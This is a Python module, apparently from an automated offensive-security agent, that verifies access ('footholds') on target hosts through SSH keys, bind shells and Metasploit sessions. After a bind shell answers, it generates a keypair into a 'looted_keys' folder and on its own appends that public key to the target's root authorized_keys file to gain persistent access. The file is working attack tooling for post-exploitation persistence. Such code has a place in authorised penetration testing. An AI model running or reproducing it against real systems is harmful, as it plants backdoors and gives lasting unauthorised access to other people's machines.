import socket, subprocess, time, uuid, os
from tools.registry import REGISTRY

REVERSE_SHELL_WAIT = 8

def _find_free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", 0))
        return s.getsockname()[1]

def _get_or_create_ssh_key(host_ip: str) -> str:
    key_dir = os.path.abspath("looted_keys")
    os.makedirs(key_dir, exist_ok=True)
    key_path = os.path.join(key_dir, f"target_{host_ip}_id_rsa")
    
    if not os.path.exists(key_path):
        print(f"[*] Generating SSH keypair for persistence on {host_ip}...")
        subprocess.run(
            ["ssh-keygen", "-t", "rsa", "-b", "2048", "-N", "", "-f", key_path, "-q"],
            check=True
        )
    return key_path


def verify_foothold(host) -> bool:
    if not getattr(host, "foothold", None):
        return False

    check_token = f"AGENT_VERIFY_{uuid.uuid4().hex[:8]}"
    foothold = host.foothold
    ftype = foothold.get("type")
    details = foothold.get("details", {}) if isinstance(foothold.get("details"), dict) else {}

    print(f"[*] Verifying foothold via {ftype}...")

    if ftype in ("ssh_key", "ssh_key_drop"):
        tool = REGISTRY.get("ssh_exec")
        if not tool:
            return _fail(host)
        from executor import execute_action
        
        key_path = details.get("local_key_path") or details.get("key_path")
        user = details.get("user", "root")
        
        planned_args = {
            "target_ip": host.ip,
            "user": user,
            "key_path": key_path,
            "command": f"echo {check_token}"
        }
        
        info, _ = execute_action(f"echo {check_token}", tool, host, planned_args=planned_args)
        if info.get("ok") and check_token in str(info.get("result", "")):
            return _ok()
        return _fail(host)

    if ftype == "bind_shell":
        port = details.get("port") or details.get("bind_port")
        if not port:
            print("[-] bind_shell claim missing 'port'.")
            return _fail(host)
            
        for attempt in range(3):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((host.ip, int(port)))
                    time.sleep(0.5)
                    s.sendall(f"echo {check_token}\n".encode())
                    time.sleep(1.5)
                    
                    response = b""
                    while True:
                        try:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            response += chunk
                            
                            if check_token.encode() in response:
                                print("[+] Bind shell verified. Attempting automatic persistence (SSH key drop)...")
                                
                                key_path = _get_or_create_ssh_key(host.ip)
                                with open(f"{key_path}.pub", "r") as f:
                                    pubkey = f.read().strip()
                                
                                drop_cmd = f"mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys\n"
                                s.sendall(drop_cmd.encode())
                                time.sleep(1.5)
                                
                                host.foothold = {
                                    "type": "ssh_key",
                                    "details": {
                                        "user": "root",
                                        "local_key_path": key_path
                                    }
                                }
                                print(f"[+] Persistence successful! Foothold dynamically upgraded to SSH key.")
                                return _ok()
                                
                        except socket.timeout:
                            break
            except Exception as e:
                print(f"[-] Bind shell verification attempt {attempt+1} failed: {e}")
            time.sleep(1)
            
        print(f"[-] bind_shell on {host.ip}:{port} did not echo token.")
        return _fail(host)

    if ftype == "reverse_shell":
        callback_port = details.get("callback_port") or details.get("port")
        print(f"[-] reverse_shell verification requires a live listener on port {callback_port}.")
        return _fail(host)

    if ftype in ("meterpreter", "msf_shell"):
        msf = REGISTRY.get("msf_sessions")
        if not msf:
            return _fail(host)
        sid = details.get("session_id")
        if not sid:
            return _fail(host)
        r = msf.execute_fn({"session_id": sid, "command": f"echo {check_token}"})
        if r.get("code") == 0 and check_token in r.get("stdout", ""):
            return _ok()
        return _fail(host)

    print(f"[-] Unsupported foothold type '{ftype}'.")
    return _fail(host)


def _ok() -> bool:
    print("[+] Foothold VERIFIED. Active access confirmed.")
    return True

def _fail(host) -> bool:
    host.foothold = None
    return False
